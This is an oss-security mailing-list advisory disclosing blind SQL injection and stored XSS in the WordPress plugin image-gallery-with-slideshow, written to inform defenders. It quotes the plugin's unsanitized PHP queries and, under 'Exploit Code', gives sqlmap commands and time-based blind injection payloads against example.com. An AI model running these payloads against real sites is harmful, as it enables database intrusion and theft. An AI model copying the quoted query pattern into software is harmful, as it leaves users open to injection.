  oss-security - Blind SQL Injection and persistent XSS in Wordpress plugin  image-gallery-with-slideshow            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 05 Apr From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Blind SQL Injection and persistent XSS in Wordpress plugin  image-gallery-with-slideshow  Title: Blind SQL Injection and persistent XSS in Wordpress plugin image-gallery-with-slideshow Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/image-gallery-with-slideshow/ Vendor: http://www.anblik.com/ Vendor Notified: Vendor Contact: https://twitter.com/anblik Advisory: Description: Image Gallery with Slideshow is a full integrated Image Gallery and Slideshow plugin for WordPress. Vulnerability:  There is a stored XSS vulnerability via the $value->gallery_name and $value->gallery_description where anyone with privileges to modify or add galleries / images and inject javascript into the database.   <td><a class="row-title" title="Edit" href="<?php echo bloginfo('url');?>/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=<?php echo $value->gallery_id;?>"><?php echo $value->gallery_name;?></a></td>  <td>&nbsp;<?php echo $value->gallery_description;?></td>   In image-gallery-with-slideshow/admin_setting.php the following snippet of code does not sanitize input via the gid variable before passing it into an SQL statement:   if($_REQUEST['val'] == 'view') {         $path_value = get_combo_path_value();         $id = $_REQUEST['gid'];         global $wpdb;         $table_prefix = $wpdb->prefix;         $result = $wpdb->get_results("SELECT ig.gallery_name,ii.image_id,ii.original_name,ii.image_name,ii.gallery_id,ii.image_title,ii.link_url,ii.image_description FROM `".$table_prefix."combo_gallery` AS ig,`".$table_prefix."combo_image` AS ii WHERE ig.gallery_   id=ii.gallery_id AND ii.gallery_id =".$id);   if($_REQUEST['val'] == 'edit') {         $id = $_REQUEST['gid'];         global $wpdb;         $table_prefix = $wpdb->prefix; . . .         $edit_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_gallery` WHERE gallery_id = ".$id);  Blind SQL Injection via imgid parameter.  if($_REQUEST['val'] == 'imgedit') {         $id = $_REQUEST['imgid'];         $gid = $_REQUEST['gid'];         global $wpdb; . .         if(isset($_REQUEST['edit_image_submit']))         { . . .         $edit_img_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE image_id = ".$id);   if($_REQUEST['gval'] == 'delete') {         $id = $_REQUEST['gid'];         global $wpdb;         $table_prefix = $wpdb->prefix;         $info = $_SERVER['DOCUMENT_ROOT'];         $path_value = get_combo_path_value();         $select_img_query_result = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE gallery_id=".$id);   if($_REQUEST['ival'] == 'delete') {         $path_value = get_combo_path_value();         $id = $_REQUEST['gid'];         global $wpdb;         $table_prefix = $wpdb->prefix;         $info = $_SERVER['DOCUMENT_ROOT'];         $select_img_query_result1 = $wpdb->get_results("SELECT * FROM `".$table_prefix."combo_image` WHERE image_id=".$id);  Blind SQL Injection via gallery_name parameter.  if(isset($_POST['gallery_submit'])) {         $gallery_name = $_REQUEST['gallery_name'];         $insert_query_result = $wpdb->insert($table_prefix.'combo_gallery', array('gallery_name' => $gallery_name,'date' => current_time('mysql')));   Blind SQL Injection via selectMulGallery parameter. if(isset($_POST['image_submit'])) {         $gallery_id = $_POST['selectMulGallery'];         $update_gallery_query = "UPDATE `".$table_prefix."combo_image` SET gallery_id=".$gallery_id." WHERE gallery_id = '0'";         $wpdb->query($update_gallery_query);  Exploit Code: 	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=*' --load-cookies=./cookie.txt --dbms=mysql --risk 2 --level 2 	•   	•   	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: WHEN THEN SLEEP(5) ELSE END) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	•   	• [*] shutting down at 	•   	•   	• $ sqlmap -u --load-cookies=./cookie.txt --dbms=mysql --risk 2 --level 2 	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=(CASE WHEN THEN SLEEP(5) ELSE END)&gid=1 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      